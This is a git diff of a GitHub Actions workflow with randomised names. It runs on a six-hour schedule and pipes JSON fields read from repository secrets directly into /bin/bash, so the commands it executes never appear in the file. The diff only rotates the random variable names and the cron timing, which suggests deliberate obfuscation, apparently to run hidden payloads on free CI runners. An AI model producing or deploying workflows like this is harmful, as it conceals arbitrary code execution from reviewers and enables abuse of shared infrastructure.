@@ -1,26 +1,26 @@
 name: mazhengfu4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 4/6 * * *'
-jobs:  # 21190
+    - cron: '35 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: mazhengfu4567
         env:
-          bkt1610: ${{ secrets.bkt1610 }}
+          mkx941: ${{ secrets.mkx941 }}
         run: |
-          echo $bkt1610 | jq -r .fa4301 | /bin/bash
-          echo $ukjle792 | jq -r .xthwf6 | /bin/bash
-          echo $llwh0 | jq -r .kudib840 | /bin/bash
-          echo $xwbge15 | jq -r .brmi9767 | /bin/bash
-          echo $mx19 | jq -r .rd30402 | /bin/bash
-          echo $p05538 | jq -r .pc6865 | /bin/bash
-          echo $xlmx4961 | jq -r .rx46 | /bin/bash
-          echo $s84 | jq -r .fw2349 | /bin/bash
-          echo $pprlz7671 | jq -r .hpujr51 | /bin/bash
-          echo $drn35 | jq -r .hm7114 | /bin/bash
-          echo $w1243 | jq -r .vd7 | /bin/bash
+          echo $mkx941 | jq -r .bfjps1 | /bin/bash
+          echo $dm9459 | jq -r .q76 | /bin/bash
+          echo $wpujq4087 | jq -r .shnj760 | /bin/bash
+          echo $jeanb2 | jq -r .eq6023 | /bin/bash
+          echo $dq97065 | jq -r .eqngq116 | /bin/bash
+          echo $i268 | jq -r .fmt2 | /bin/bash
+          echo $qs3 | jq -r .f48 | /bin/bash
+          echo $zindd97161 | jq -r .ubjal311 | /bin/bash
+          echo $g8766 | jq -r .ubvvh0 | /bin/bash
 
